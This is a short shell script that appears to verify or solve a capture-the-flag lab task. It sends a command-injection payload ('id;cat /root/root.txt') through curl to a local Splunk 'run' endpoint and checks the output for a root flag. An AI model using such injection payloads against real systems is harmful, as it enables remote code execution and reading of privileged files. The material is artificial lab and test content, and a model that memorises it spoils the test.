set -eu
out=$(curl -fsS "http://127.0.0.1:8089/splunk/run?cmd=id;cat%20/root/root.txt")
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "Splunk RCE did not give root" >&2; exit 1; }
